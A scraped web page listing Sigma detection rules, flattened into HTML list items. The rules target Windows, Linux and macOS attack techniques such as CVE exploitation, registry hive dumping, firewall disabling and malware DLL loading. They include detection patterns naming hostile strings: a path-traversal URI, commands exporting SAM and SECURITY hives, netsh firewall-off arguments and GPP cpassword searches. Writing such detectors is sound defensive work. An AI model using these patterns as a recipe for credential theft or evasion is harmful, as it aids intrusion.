(Windows NT 10.0; Win32; x32; rv:60.0)' # CobaltStrike # Empire - 'Mozilla/6.0 (X11; Linux x86_64; rv:24.0) Gecko/20140205 Firefox/27.0 Iceweasel/25.3.0' # Exploits - '*wordpress hash grabber*' - '*exploit*' condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1071.001 
<li><a href="#">title:Exploit SamAccountName Spoofing with Kerberos id: 44bbff3e-4ca3-452d-a49a-6efa4cafa06f status: experimental description: | The attacker creates a computer object using those permissions with a password known to her. After that she clears the attribute ServicePrincipalName on the computer object. Because she created the object (CREATOR OWNER), she gets granted additional permissions and can do many changes to the object. references: - author: frack113 date: 2021/12/15 logsource: product: windows service: system detection: selection_1: Provider_Name: Microsoft-Windows-Kerberos-Key-Distribution-Center # Active Directory EventID: - 35 - 36 - 37 - 38 selection_2: Provider_Name: Microsoft-Windows-Directory-Services-SAM # Active Directory EventID: - 16990 - 16991 condition: selection_1 or selection_2 fields: - samAccountName falsepositives: - Unknown level: medium tags: - attack.credential_access - attack.t1558.003 
<li><a href="#">title:Exploitation of CVE-2021-26814 in Wazuh id: b9888738-29ed-4c54-96a4-f38c57b84bb3 status: experimental description: Detects the exploitation of the Wazuh RCE vulnerability described in CVE-2021-26814 author: Florian Roth date: 2021/05/22 references: - logsource: category: webserver detection: selection: c-uri|contains: '/manager/files?path=etc/lists/../../../../..' condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: high tags: - attack.initial_access - attack.t1190 - cve.2021.21978 - cve.2021.26814 
<li><a href="#">title:Exploited CVE-2020-10189 Zoho ManageEngine id: 846b866e-2a57-46ee-8e16-85fa92759be7 status: stable description: Detects the exploitation of Zoho ManageEngine Desktop Central Java Deserialization vulnerability reported as CVE-2020-10189 author: Florian Roth references: - - date: 2020/03/25 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: 'DesktopCentral_Server\jre\bin\java.exe' Image|endswith: - '\cmd.exe' - '\powershell.exe' - '\bitsadmin.exe' condition: selection falsepositives: - Unknown level: high tags: - attack.initial_access - attack.t1190 - attack.execution - attack.t1059.001 - attack.t1059.003 - attack.s0190 - cve.2020.10189 
<li><a href="#">title:Exploiting CVE-2019-1388 id: 02e0b2ea-a597-428e-b04a-af6a1a403e5c status: stable description: Detects an exploitation attempt in which the UAC consent dialogue is used to invoke an Internet Explorer process running as LOCAL_SYSTEM references: - - author: Florian Roth date: 2019/11/20 modified: 2022/05/27 tags: - attack.privilege_escalation - attack.t1068 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\consent.exe' Image|endswith: '\iexplore.exe' CommandLine|contains: ' http' rights1: IntegrityLevel: 'System' # for Sysmon users rights2: User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' condition: selection and ( rights1 or rights2 ) falsepositives: - Unknown level: critical 
<li><a href="#">title:Exploiting SetupComplete.cmd CVE-2019-1378 id: 1c373b6d-76ce-4553-997d-8c1da9a6b5f5 status: test description: Detects exploitation attempt of privilege escalation vulnerability via SetupComplete.cmd and PartnerSetupComplete.cmd described in CVE-2019-1378 author: Florian Roth, oscd.community, Jonhnathan Ribeiro references: - date: 2019/11/15 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentCommandLine|contains|all: - '\cmd.exe' - '/c' - 'C:\Windows\Setup\Scripts\' ParentCommandLine|endswith: - 'SetupComplete.cmd' - 'PartnerSetupComplete.cmd' filter: Image|startswith: - 'C:\Windows\System32\' - 'C:\Windows\SysWOW64\' - 'C:\Windows\WinSxS\' - 'C:\Windows\Setup\' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.t1068 - attack.execution - attack.t1059.003 - attack.t1574 - cve.2019.1378 
<li><a href="#">title:Explorer NOUACCHECK Flag id: 534f2ef7-e8a2-4433-816d-c91bccde289b status: test description: Detects suspicious starts of explorer.exe that use the /NOUACCHECK flag that allows to run all sub processes of that newly started explorer.exe without any UAC checks author: Florian Roth references: - date: 2022/02/23 modified: 2022/04/21 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\explorer.exe' CommandLine|contains: '/NOUACCHECK' filter_dc_logon: - ParentCommandLine: 'C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule' - ParentImage: 'C:\Windows\System32\svchost.exe' # coarse filter needed for ID 4688 Events condition: selection and not 1 of filter_* falsepositives: - Domain Controller User Logon - Unknown how many legitimate software products use that method level: high tags: - attack.defense_evasion - attack.t1548.002 
<li><a href="#">title:Explorer Process Tree Break id: 949f1ffb-6e85-4f00-ae1e-c3c5b190d605 status: test description: Detects a command line process that uses explorer.exe to launch arbitrary commands or binaries, which is similar to cmd.exe /c, only it breaks the process tree and makes its parent a new instance of explorer spawning from "svchost" author: Florian Roth, Nasreddine Bencherchali references: - - - - date: 2019/06/29 modified: 2022/06/14 logsource: category: process_creation product: windows detection: selection: # See CLSID_SeparateMultipleProcessExplorerHost in the registry for reference CommandLine|contains: '/factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b}' condition: selection falsepositives: - Unknown how many legitimate software products use that method level: medium tags: - attack.defense_evasion - attack.t1036 
<li><a href="#">title:Exports Critical Registry Keys To a File id: 82880171-b475-4201-b811-e9c826cd5eaa status: test description: Detects the export of a crital Registry key to a file. author: Oddvar Moe, Sander Wiebing, oscd.community references: - - date: 2020/10/12 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\regedit.exe' CommandLine|contains: ' /E ' selection_2: CommandLine|contains: - 'hklm' - 'hkey_local_machine' selection_3: CommandLine|endswith: - '\system' - '\sam' - '\security' condition: selection and selection_2 and selection_3 fields: - ParentImage - CommandLine falsepositives: - Dumping hives for legitimate purpouse i.e. backup or forensic investigation level: high tags: - attack.exfiltration - attack.t1012 
<li><a href="#">title:Exports Registry Key To a File id: f0e53e89-8d22-46ea-9db5-9d4796ee2f8a status: test description: Detects the export of the target Registry key to a file. author: Oddvar Moe, Sander Wiebing, oscd.community references: - - date: 2020/10/07 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\regedit.exe' CommandLine|contains: ' /E ' filter_1: # filters to avoid intersection with critical keys rule CommandLine|contains: - 'hklm' - 'hkey_local_machine' filter_2: CommandLine|endswith: - '\system' - '\sam' - '\security' condition: selection and not (filter_1 and filter_2) fields: - ParentImage - CommandLine falsepositives: - Legitimate export of keys level: low tags: - attack.exfiltration - attack.t1012 
<li><a href="#">title:Exports Registry Key To an Alternate Data Stream id: 0d7a9363-af70-4e7b-a3b7-1a176b7fbe84 status: test description: Exports the target Registry key and hides it in the specified alternate data stream. author: Oddvar Moe, Sander Wiebing, oscd.community references: - - date: 2020/10/07 modified: 2021/11/27 logsource: product: windows category: create_stream_hash detection: selection: Image|endswith: '\regedit.exe' condition: selection fields: - TargetFilename falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1564.004 
<li><a href="#">title:External Disk Drive Or USB Storage Device id: f69a87ea-955e-4fb4-adb2-bb9fd6685632 description: Detects external diskdrives or plugged in USB devices , EventID 6416 on windows 10 or later status: experimental author: Keith Wright date: 2019/11/20 modified: 2021/08/09 tags: - attack.t1091 - attack.t1200 - attack.lateral_movement - attack.initial_access logsource: product: windows service: security detection: selection: EventID: 6416 ClassName: 'DiskDrive' selection2: DeviceDescription: 'USB Mass Storage Device' condition: selection or selection2 falsepositives: - Legitimate administrative activity level: low 
<li><a href="#">title:Extracting Information with PowerShell id: bd5971a7-626d-46ab-8176-ed643f694f68 status: experimental author: frack113 date: 2021/12/19 description: | Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords. references: - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - ls - ' -R' - 'select-string ' - '-Pattern ' condition: selection falsepositives: - Unknown level: medium tags: - attack.credential_access - attack.t1552.001 
<li><a href="#">title:Failed Code Integrity Checks id: 470ec5fa-7b4e-4071-b200-4c753100f49b status: stable description: Code integrity failures may indicate tampered executables. author: Thomas Patzke date: 2019/12/03 modified: 2020/08/23 tags: - attack.defense_evasion - attack.t1027.001 logsource: product: windows service: security detection: selection: EventID: - 5038 - 6281 condition: selection falsepositives: - Disk device errors level: low 
<li><a href="#">title:Failed Logins with Different Accounts from Single Source System id: 6309ffc4-8fa2-47cf-96b8-a2f72e58e538 related: - id: e98374a6-e2d9-4076-9b5c-11bdb2569995 type: derived description: Detects suspicious failed logins with different user accounts from a single source system status: experimental author: Florian Roth date: 2017/01/10 modified: 2021/09/21 tags: - attack.persistence - attack.privilege_escalation - attack.t1078 logsource: product: windows service: security detection: selection2: EventID: 4776 TargetUserName: '*' Workstation: '*' timeframe: 24h condition: selection2 falsepositives: - Terminal servers - Jump servers - Other multiuser systems like Citrix server farms - Workstations with frequently changing users level: medium 
<li><a href="#">title:Failed Logins with Different Accounts from Single Source System id: e98374a6-e2d9-4076-9b5c-11bdb2569995 description: Detects suspicious failed logins with different user accounts from a single source system status: experimental author: Florian Roth date: 2017/01/10 modified: 2021/09/21 tags: - attack.persistence - attack.privilege_escalation - attack.t1078 logsource: product: windows service: security detection: selection1: EventID: - 529 - 4625 TargetUserName: '*' WorkstationName: '*' condition: selection1 falsepositives: - Terminal servers - Jump servers - Other multiuser systems like Citrix server farms - Workstations with frequently changing users level: medium 
<li><a href="#">title:Failed Logins with Different Accounts from Single Source System id: fc947f8e-ea81-4b14-9a7b-13f888f94e18 status: test description: Detects suspicious failed logins with different user accounts from a single source system author: Florian Roth date: 2017/02/16 modified: 2021/11/27 logsource: product: linux service: auth detection: selection: pam_message: authentication failure pam_user: '*' pam_rhost: '*' timeframe: 24h condition: selection falsepositives: - Terminal servers - Jump servers - Workstations with frequently changing users level: medium tags: - attack.credential_access - attack.t1110 
<li><a href="#">title:Failed Logon From Public IP id: f88e112a-21aa-44bd-9b01-6ee2a2bbbed1 status: test description: A login from a public IP can indicate a misconfigured firewall or network boundary. author: NVISO date: 2020/05/06 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 4625 ip_unknown: IpAddress|contains: '-' ip_privatev4: IpAddress|startswith: - '10.' #10.0.0.0/8 - '192.168.' #192.168.0.0/16 - '172.16.' #172.16.0.0/12 - '172.17.' - '172.18.' - '172.19.' - '172.20.' - '172.21.' - '172.22.' - '172.23.' - '172.24.' - '172.25.' - '172.26.' - '172.27.' - '172.28.' - '172.29.' - '172.30.' - '172.31.' - '127.' #127.0.0.0/8 - '169.254.' #169.254.0.0/16 ip_privatev6: - IpAddress: '::1' #loopback - IpAddress|startswith: - 'fe80::' #link-local - 'fc00::' #unique local condition: selection and not 1 of ip_* falsepositives: - Legitimate logon attempts over the internet - IPv4-to-IPv6 mapped IPs level: medium tags: - attack.initial_access - attack.persistence - attack.t1078 - attack.t1190 - attack.t1133 
<li><a href="#">title:Failed MSExchange Transport Agent Installation id: c7d16cae-aaf3-42e5-9c1c-fb8553faa6fa status: experimental description: Detects a failed installation of a Exchange Transport Agent references: - tags: - attack.persistence - attack.t1505.002 author: Tobias Michalski date: 2021/06/08 logsource: service: msexchange-management product: windows detection: selection: EventID: 6 keywords: - 'Install-TransportAgent' condition: selection and keywords fields: - AssemblyPath falsepositives: - Legitimate installations of exchange TransportAgents. AssemblyPath is a good indicator for this. level: high 
<li><a href="#">title:Failed to Load Policy in Windows Firewall with Advanced Security id: 7ec15688-fd24-4177-ba43-1a950537ee39 status: experimental description: The Windows Firewall service failed to load Group Policy. author: frack113 date: 2022/02/19 references: - (v=ws.10) logsource: product: windows service: firewall-as # EventID 49xx and 50xx are not used in the rule, please don't use Windows Server 2008 R2 detection: selection: EventID: 2009 condition: selection level: low 
<li><a href="#">title:False Sysinternals Suite Tools id: 7cce6fc8-a07f-4d84-a53e-96e1879843c9 status: experimental description: Rename as a legitim Sysinternals Suite tools to evade detection references: - author: frack113 date: 2021/12/20 logsource: category: process_creation product: windows detection: selection_exe: Image|endswith: - '\accesschk.exe' - '\accesschk64.exe' - '\AccessEnum.exe' - '\ADExplorer.exe' - '\ADExplorer64.exe' - '\ADInsight.exe' - '\ADInsight64.exe' - '\adrestore.exe' - '\adrestore64.exe' - '\Autologon.exe' - '\Autologon64.exe' - '\Autoruns.exe' - '\Autoruns64.exe' - '\autorunsc.exe' - '\autorunsc64.exe' - '\Bginfo.exe' - '\Bginfo64.exe' - '\Cacheset.exe' - '\Cacheset64.exe' - '\Clockres.exe' - '\Clockres64.exe' - '\Contig.exe' - '\Contig64.exe' - '\Coreinfo.exe' - '\Coreinfo64.exe' - '\CPUSTRES.EXE' - '\CPUSTRES64.EXE' - '\ctrl2cap.exe' - '\Dbgview.exe' - '\dbgview64.exe' - '\Desktops.exe' - '\Desktops64.exe' - '\disk2vhd.exe' - '\disk2vhd64.exe' - '\diskext.exe' - '\diskext64.exe' - '\Diskmon.exe' - '\Diskmon64.exe' - '\DiskView.exe' - '\DiskView64.exe' - '\du.exe' - '\du64.exe' - '\efsdump.exe' - '\FindLinks.exe' - '\FindLinks64.exe' - '\handle.exe' - '\handle64.exe' - '\hex2dec.exe' - '\hex2dec64.exe' - '\junction.exe' - '\junction64.exe' - '\ldmdump.exe' - '\listdlls.exe' - '\listdlls64.exe' - '\livekd.exe' - '\livekd64.exe' - '\loadOrd.exe' - '\loadOrd64.exe' - '\loadOrdC.exe' - '\loadOrdC64.exe' - '\logonsessions.exe' - '\logonsessions64.exe' - '\movefile.exe' - '\movefile64.exe' - '\notmyfault.exe' - '\notmyfault64.exe' - '\notmyfaultc.exe' - '\notmyfaultc64.exe' - '\ntfsinfo.exe' - '\ntfsinfo64.exe' - '\pendmoves.exe' - '\pendmoves64.exe' - '\pipelist.exe' - '\pipelist64.exe' - '\portmon.exe' - '\procdump.exe' - '\procdump64.exe' - '\procexp.exe' - '\procexp64.exe' - '\Procmon.exe' - '\Procmon64.exe' - '\psExec.exe' - '\psExec64.exe' - '\psfile.exe' - '\psfile64.exe' - '\psGetsid.exe' - '\psGetsid64.exe' - '\psInfo.exe' - '\psInfo64.exe' - '\pskill.exe' - '\pskill64.exe' - '\pslist.exe' - '\pslist64.exe' - '\psLoggedon.exe' - '\psLoggedon64.exe' - '\psloglist.exe' - '\psloglist64.exe' - '\pspasswd.exe' - '\pspasswd64.exe' - '\psping.exe' - '\psping64.exe' - '\psService.exe' - '\psService64.exe' - '\psshutdown.exe' - '\psshutdown64.exe' - '\pssuspend.exe' - '\pssuspend64.exe' - '\RAMMap.exe' - '\RDCMan.exe' - '\RegDelNull.exe' - '\RegDelNull64.exe' - '\regjump.exe' - '\ru.exe' - '\ru64.exe' - '\sdelete.exe' - '\sdelete64.exe' - '\ShareEnum.exe' - '\ShareEnum64.exe' - '\shellRunas.exe' - '\sigcheck.exe' - '\sigcheck64.exe' - '\streams.exe' - '\streams64.exe' - '\strings.exe' - '\strings64.exe' - '\sync.exe' - '\sync64.exe' - '\Sysmon.exe' - '\Sysmon64.exe' - '\tcpvcon.exe' - '\tcpvcon64.exe' - '\tcpview.exe' - '\tcpview64.exe' - '\Testlimit.exe' - '\Testlimit64.exe' - '\vmmap.exe' - '\vmmap64.exe' - '\Volumeid.exe' - '\Volumeid64.exe' - '\whois.exe' - '\whois64.exe' - '\Winobj.exe' - '\Winobj64.exe' - '\ZoomIt.exe' - '\ZoomIt64.exe' filter_valid: Company: - 'Sysinternals - www.sysinternals.com' - 'Sysinternals' filter_empty: Company: null condition: selection_exe and not 1 of filter* falsepositives: - Unknown level: medium tags: - attack.execution - attack.defense_evasion - attack.t1218 - attack.t1202 
<li><a href="#">title:Fax Service DLL Search Order Hijack id: 828af599-4c53-4ed2-ba4a-a9f835c434ea status: test description: The Fax service attempts to load ualapi.dll, which is non-existent. An attacker can then (side)load their own malicious DLL using this service. author: NVISO references: - date: 2020/05/04 modified: 2022/06/02 logsource: category: image_load product: windows detection: selection: Image|endswith: '\fxssvc.exe' ImageLoaded|endswith: ualapi.dll filter: ImageLoaded|startswith: C:\Windows\WinSxS\ condition: selection and not filter falsepositives: - Unlikely level: high tags: - attack.persistence - attack.defense_evasion - attack.t1574.001 - attack.t1574.002 
<li><a href="#">title:File and Directory Discovery id: 089dbdf6-b960-4bcc-90e3-ffc3480c20f6 status: test description: Detects usage of system utilities to discover files and directories author: Daniil Yugoslavskiy, oscd.community references: - date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: macos detection: select_file_with_asterisk: Image: '/usr/bin/file' CommandLine|re: '(.){200,}' # execution of the 'file */* *>> /tmp/output.txt' will produce huge commandline select_recursive_ls: Image: '/bin/ls' CommandLine|contains: '-R' select_find_execution: Image: '/usr/bin/find' select_mdfind_execution: Image: '/usr/bin/mdfind' select_tree_execution|endswith: Image: '/tree' condition: 1 of select* falsepositives: - Legitimate activities level: informational tags: - attack.discovery - attack.t1083 
<li><a href="#">title:File and Directory Discovery id: d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72 status: test description: Detects usage of system utilities to discover files and directories author: Daniil Yugoslavskiy, oscd.community references: - date: 2020/10/19 modified: 2021/11/27 logsource: category: process_creation product: linux detection: select_file_with_asterisk: Image|endswith: '/file' CommandLine|re: '(.){200,}' # execution of the 'file */* *>> /tmp/output.txt' will produce huge commandline select_recursive_ls: Image|endswith: '/ls' CommandLine|contains: '-R' select_find_execution: Image|endswith: '/find' select_tree_execution: Image|endswith: '/tree' condition: 1 of select* falsepositives: - Legitimate activities level: informational tags: - attack.discovery - attack.t1083 
<li><a href="#">title:File Created with System Process Name id: d5866ddf-ce8f-4aea-b28e-d96485a20d3d status: test description: Detects the creation of an executable with a system process name in a suspicious folder author: Sander Wiebing, Tim Shelton date: 2020/05/26 modified: 2022/02/22 tags: - attack.defense_evasion - attack.t1036.005 logsource: category: file_event product: windows detection: selection: TargetFilename|endswith: - '\svchost.exe' - '\rundll32.exe' - '\services.exe' - '\powershell.exe' - '\regsvr32.exe' - '\spoolsv.exe' - '\lsass.exe' - '\smss.exe' - '\csrss.exe' - '\conhost.exe' - '\wininit.exe' - '\lsm.exe' - '\winlogon.exe' - '\explorer.exe' - '\taskhost.exe' - '\Taskmgr.exe' - '\taskmgr.exe' - '\sihost.exe' - '\RuntimeBroker.exe' - '\runtimebroker.exe' - '\smartscreen.exe' - '\dllhost.exe' - '\audiodg.exe' - '\wlanext.exe' filter1: TargetFilename|startswith: - 'C:\Windows\System32\' - 'C:\Windows\system32\' - 'C:\Windows\SysWow64\' - 'C:\Windows\SysWOW64\' - 'C:\Windows\winsxs\' - 'C:\Windows\WinSxS\' - '\SystemRoot\System32\' Image|endswith: - '\Windows\System32\dism.exe' - '\TiWorker.exe' filter2: TargetFilename|startswith: 'C:\$WINDOWS.~BT\' Image: 'C:\$WINDOWS.~BT\Sources\SetupHost.exe' filter3: TargetFilename|endswith: '\RuntimeBroker.exe' Image: 'C:\Windows\system32\wbengine.exe' condition: selection and not 1 of filter* fields: - Image falsepositives: - System processes copied outside the default folder level: high 
<li><a href="#">title:File Deletion id: 30aed7b6-d2c1-4eaf-9382-b6bc43e50c57 status: stable description: Detects file deletion commands author: Ã–mer GÃ¼nal, oscd.community date: 2020/10/07 references: - logsource: product: linux category: process_creation detection: selection: Image|endswith: - '/rm' # covers /rmdir as well - '/shred' condition: selection falsepositives: - Legitimate administration activities level: informational tags: - attack.defense_evasion - attack.t1070.004 
<li><a href="#">title:File Download with Headless Browser id: 0e8cfe08-02c9-4815-a2f8-0d157b7ed33e description: This is an unusual method to download files. It starts a browser headless and downloads a file from a location. This can be used by threat actors to download files. status: experimental author: Sreeman, Florian Roth date: 2022/01/04 references: - tags: - attack.command_and_control - attack.t1105 logsource: category: process_creation product: windows detection: selection: Image|endswith: - '\msedge.exe' - '\chrome.exe' CommandLine|contains|all: - '--headless' - 'dump-dom' - 'http' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:File or Folder Permissions Change id: 74c01ace-0152-4094-8ae2-6fd776dd43e5 status: test description: Detects file and folder permission changes. author: Jakob Weinzettl, oscd.community references: - date: 2019/09/23 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: 'EXECVE' a0|contains: - 'chmod' - 'chown' condition: selection falsepositives: - User interacting with files permissions (normal/daily behaviour). level: low tags: - attack.defense_evasion - attack.t1222.002 
<li><a href="#">title:File or Folder Permissions Modifications id: 37ae075c-271b-459b-8d7b-55ad5f993dd8 status: test description: Detects a file or folder's permissions being modified. author: Jakob Weinzettl, oscd.community references: - date: 2019/10/23 modified: 2022/05/12 logsource: category: process_creation product: windows detection: selection: Image|endswith: - '\takeown.exe' - '\cacls.exe' - '\icacls.exe' CommandLine|contains: '/grant' selection2: Image|endswith: '\attrib.exe' CommandLine|contains: '-r' filter_reset: CommandLine|endswith: 'ICACLS C:\ProgramData\dynatrace\gateway\config\connectivity.history /reset' filter_grant: CommandLine|contains|all: - 'ICACLS C:\ProgramData\dynatrace\gateway\config\config.properties /grant :r ' - 'S-1-5-19:F' filter_programs: CommandLine|contains: '\AppData\Local\Programs\Microsoft VS Code' condition: selection or selection2 and not 1 of filter* fields: - ComputerName - User - CommandLine falsepositives: - Users interacting with the files on their own (unlikely unless privileged users). - Dynatrace app level: medium tags: - attack.defense_evasion - attack.t1222.001 
<li><a href="#">title:'File Time Attribute Change' id: 88c0f9d8-30a8-4120-bb6b-ebb54abcf2a0 status: test description: 'Detect file time attribute change to hide new or changes to existing files.' author: 'Igor Fits, Mikhail Larin, oscd.community' references: - date: 2020/10/19 modified: 2021/11/27 logsource: product: macos category: process_creation detection: selection1: Image|endswith: '/touch' selection2: CommandLine|contains: - '-t' - '-acmr' - '-d' - '-r' condition: selection1 and selection2 falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1070.006 
<li><a href="#">title:'File Time Attribute Change' id: b3cec4e7-6901-4b0d-a02d-8ab2d8eb818b status: test description: 'Detect file time attribute change to hide new or changes to existing files.' author: 'Igor Fits, oscd.community' references: - date: 2020/10/15 modified: 2021/11/27 logsource: product: linux service: auditd detection: execve: type: 'EXECVE' touch: - 'touch' selection2: - '-t' - '-acmr' - '-d' - '-r' condition: execve and touch and selection2 falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1070.006 
<li><a href="#">title:File Was Not Allowed To Run id: 401e5d00-b944-11ea-8f9a-00163ecd60ae status: test description: Detect run not allowed files. Applocker is a very useful tool, especially on servers where unprivileged users have access. For example terminal servers. You need configure applocker and log collect to receive these events. author: Pushkarev Dmitry references: - - - date: 2020/06/28 modified: 2021/11/27 logsource: product: windows service: applocker detection: selection: EventID: - 8004 - 8007 condition: selection fields: - PolicyName - RuleId - RuleName - TargetUser - TargetProcessId - FilePath - FileHash - Fqbn falsepositives: - Need tuning applocker or add exceptions in SIEM level: medium tags: - attack.execution - attack.t1204.002 - attack.t1059.001 - attack.t1059.003 - attack.t1059.005 - attack.t1059.006 - attack.t1059.007 
<li><a href="#">title:Findstr GPP Passwords id: 91a2c315-9ee6-4052-a853-6f6a8238f90d status: experimental description: Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt. author: frack113 references: - date: 2021/12/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \findstr.exe CommandLine|contains|all: - cpassword - \sysvol\ - .xml condition: selection falsepositives: - Unknown level: high tags: - attack.credential_access - attack.t1552.006 
<li><a href="#">title:Findstr Launching .lnk File id: 33339be3-148b-4e16-af56-ad16ec6c7e7b status: test description: Detects usage of findstr to identify and execute a lnk file as seen within the HHS redirect attack author: Trent Liffick references: - date: 2020/05/01 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\findstr.exe' CommandLine|endswith: '.lnk' condition: selection fields: - Image - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1036 - attack.t1202 - attack.t1027.003 
<li><a href="#">title:Finger.exe Suspicious Invocation id: af491bca-e752-4b44-9c86-df5680533dbc description: Detects suspicious aged finger.exe tool execution often used in malware attacks nowadays status: experimental author: Florian Roth, omkar72, oscd.community date: 2021/02/24 references: - - - tags: - attack.command_and_control - attack.t1105 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\finger.exe' condition: selection falsepositives: - Admin activity (unclear what they do nowadays with finger.exe) level: high 
<li><a href="#">title:Fireball Archer Install id: 3d4aebe0-6d29-45b2-a8a4-3dfde586a26d status: test description: Detects Archer malware invocation via rundll32 author: Florian Roth references: - - date: 2017/06/03 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'rundll32.exe' - 'InstallArcherSvc' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.execution - attack.defense_evasion - attack.t1218.011 
<li><a href="#">title:Firewall Disabled via Netsh id: 57c4bf16-227f-4394-8ec7-1b745ee061c3 status: test description: Detects netsh commands that turns off the Windows firewall author: Fatih Sirin references: - - - date: 2019/11/01 modified: 2022/01/09 logsource: category: process_creation product: windows detection: selection_1: CommandLine|contains|all: - netsh - firewall - set - opmode - 'mode=disable' selection_2: CommandLine|contains|all: - netsh - advfirewall - set - state - 'off' condition: 1 of selection_* falsepositives: - Legitimate administration level: medium tags: - attack.defense_evasion - attack.t1562.004 - attack.s0108 
<li><a href="#">title:First Time Seen Remote Named Pipe - Zeek id: 021310d9-30a6-480a-84b7-eaa69aeb92bb status: test description: This detection excludes known namped pipes accessible remotely and notify on newly observed ones, may help to detect lateral movement and remote exec using named pipes author: 'Samir Bousseaden, @neu5ron' references: - date: 2020/04/02 modified: 2021/11/27 logsource: product: zeek service: smb_files detection: selection1: path: \\\*\IPC$ selection2: path: \\\*\IPC$ name: - 'atsvc' - 'samr' - 'lsarpc' - 'winreg' - 'netlogon' - 'srvsvc' - 'protected_storage' - 'wkssvc' - 'browser' - 'netdfs' - 'svcctl' - 'spoolss' - 'ntsvcs' - 'LSM_API_service' - 'HydraLsPipe' - 'TermSrv_API_service' - 'MsFteWds' condition: selection1 and not selection2 falsepositives: - Update the excluded named pipe to filter out any newly observed legit named pipe level: high tags: - attack.lateral_movement - attack.t1021.002 
<li><a href="#">title:First Time Seen Remote Named Pipe id: 52d8b0c6-53d6-439a-9e41-52ad442ad9ad status: test description: This detection excludes known namped pipes accessible remotely and notify on newly observed ones, may help to detect lateral movement and remote exec using named pipes author: Samir Bousseaden references: - date: 2019/04/03 modified: 2021/12/06 logsource: product: windows service: security definition: 'The advanced audit policy setting "Object Access > Audit Detailed File Share" must be configured for Success/Failure' detection: selection1: EventID: 5145 ShareName: \\\*\IPC$ false_positives: RelativeTargetName: - 'atsvc' - 'samr' - 'lsarpc' - 'lsass' - 'winreg' - 'netlogon' - 'srvsvc' - 'protected_storage' - 'wkssvc' - 'browser' - 'netdfs' - 'svcctl' - 'spoolss' - 'ntsvcs' - 'LSM_API_service' - 'HydraLsPipe' - 'TermSrv_API_service' - 'MsFteWds' - 'sql\query' condition: selection1 and not false_positives falsepositives: - Update the excluded named pipe to filter out any newly observed legit named pipe level: high tags: - attack.lateral_movement - attack.t1021.002 
<li><a href="#">title:Flash Player Update from Suspicious Location id: 4922a5dd-6743-4fc2-8e81-144374280997 status: test description: Detects a flashplayer update from an unofficial location author: Florian Roth references: - date: 2017/10/25 modified: 2022/01/07 logsource: category: proxy detection: selection: - c-uri-query|contains: '/flash_install.php' - c-uri-query|endswith: '/install_flash_player.exe' filter: c-uri-stem|contains: '.adobe.com/' condition: selection and not filter falsepositives: - Unknown flash download locations level: high tags: - attack.initial_access - attack.t1189 - attack.execution - attack.t1204.002 - attack.defense_evasion - attack.t1036.005 
<li><a href="#">title:FlowCloud Malware id: 5118765f-6657-4ddb-a487-d7bd673abbf1 status: experimental description: Detects FlowCloud malware from threat group TA410. references: - author: NVISO tags: - attack.persistence - attack.t1112 date: 2020/06/09 modified: 2021/07/22 logsource: product: windows category: registry_event detection: selection: - TargetObject: - 'HKLM\HARDWARE\{804423C2-F490-4ac3-BFA5-13DEDE63A71A}' - 'HKLM\HARDWARE\{A5124AF5-DF23-49bf-B0ED-A18ED3DEA027}' - 'HKLM\HARDWARE\{2DB80286-1784-48b5-A751-B6ED1F490303}' - TargetObject|startswith: - 'HKLM\SYSTEM\Setup\PrintResponsor\' condition: selection falsepositives: - Unknown level: critical 
<li><a href="#">title:FoggyWeb Backdoor DLL Loading id: 640dc51c-7713-4faa-8a0e-e7c0d9d4654c status: experimental description: Detects DLL image load activity as used by FoggyWeb backdoor loader references: - author: Florian Roth date: 2021/09/27 logsource: category: image_load product: windows detection: selection: Image: C:\Windows\ADFS\version.dll condition: selection falsepositives: - Unlikely level: critical tags: - attack.resource_development - attack.t1587 
<li><a href="#">title:Format.com FileSystem LOLBIN id: 9fb6b26e-7f9e-4517-a48b-8cac4a1b6c60 status: experimental description: Detects the execution of format.com with a suspicious filesystem selection that could indicate a defense evasion activity in which format.com is used to load malicious DLL files or other programs author: Florian Roth date: 2022/01/04 references: - - tags: - attack.defense_evasion logsource: category: process_creation product: windows detection: selection: Image|endswith: '\format.com' CommandLine|contains: '/fs:' filter: CommandLine|contains: - '/fs:FAT' - '/fs:exFAT' - '/fs:NTFS' - '/fs:UDF' - '/fs:ReFS' condition: selection and not 1 of filter* falsepositives: - Unknown level: high 
